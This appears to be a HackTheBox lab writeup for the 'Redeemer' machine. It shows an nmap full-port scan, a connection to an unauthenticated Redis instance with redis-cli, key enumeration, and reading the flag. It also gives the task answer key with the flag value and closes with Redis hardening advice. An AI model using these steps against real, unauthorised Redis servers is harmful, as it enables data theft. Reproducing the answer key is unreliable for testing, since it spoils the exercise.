# Redeemer — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-0-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-Redis%20(6379)%20unauth-red)

> **Target:** `10.129.85.197`
> **Foothold:** An **unauthenticated Redis** instance on `6379/tcp` — read the flag straight out of the key-value store.

---

## 🧭 Overview

Redeemer runs a **Redis** in-memory database on `6379/tcp` with **no authentication**.
Anyone who can reach the port can connect with `redis-cli`, enumerate the keyspace, and
read values. The flag is stored in a key named `flag`.

Note: Redis listens on **6379**, which is **outside Nmap's default top-1000 ports** — a
plain `nmap -sC -sV` returns nothing. A full-port sweep (`-p-`) is required to find it.

---

## 1. Reconnaissance

Host is up (TTL 63):

```bash
ping 10.129.85.197
# 64 bytes from 10.129.85.197: icmp_seq=1 ttl=63 time=244 ms
```

A default scan finds nothing — 6379 isn't in the top 1000:

```bash
nmap -sC -sV 10.129.85.197
# All 1000 scanned ports ... are in ignored states.
```

Full-port sweep (fast) reveals the real service:

```bash
nmap -p- --min-rate=2000 -T4 10.129.85.197
```

```text
PORT     STATE SERVICE
6379/tcp open  redis
```

> **Lesson:** `-A` does **not** widen the port range — it only adds version/script/OS
> detection to the default 1000 ports. Use `-p-` to scan all 65535 ports.

---

## 2. Foothold — Connect to Redis

Install the client if needed, then connect **to the target** with `-h` (without `-h`,
`redis-cli` defaults to `127.0.0.1` and refuses):

```bash
redis-cli -h 10.129.85.197
```

Pull server info — confirms Redis **5.0.7** and that **db0 holds 4 keys**:

```bash
10.129.85.197:6379> INFO
```

```text
# Server
redis_version:5.0.7
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

---

## 3. Enumerate Keys & Read the Flag

Select database 0 and list every key, then read the `flag` key:

```bash
10.129.85.197:6379> select 0
OK
10.129.85.197:6379> keys *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
10.129.85.197:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## 4. Flag

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
03e1d2b376c37ab3f5319922053953eb
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | Which TCP port is open on the machine? | 6379 |
| 2 | Which service is running on the port that is open? | Redis |
| 3 | What type of database is Redis? (In-memory / On-disk) | In-memory Database |
| 4 | Which command-line utility is used to interact with the Redis server? | redis-cli |
| 5 | Which flag is used with the Redis CLI to specify the hostname? | -h |
| 6 | Which command returns information and statistics about the Redis server? | info |
| 7 | What is the version of the Redis server being used on the target? | 5.0.7 |
| 8 | Which command is used to select the desired database? | select |
| 9 | How many keys are present inside the database with index 0? | 4 |
| 10 | Which command is used to obtain all the keys in a database? | keys * |
| 11 | Submit root flag | `03e1d2b376c37ab3f5319922053953eb` |

</details>

---

## 🛡️ Lessons / Remediation
- **Require authentication** on Redis (`requirepass`, or Redis 6+ ACLs); never run it open.
- **Bind to localhost / trusted interfaces** and firewall `6379` off untrusted networks.
- Enable **protected-mode** and avoid exposing Redis directly to the network edge.
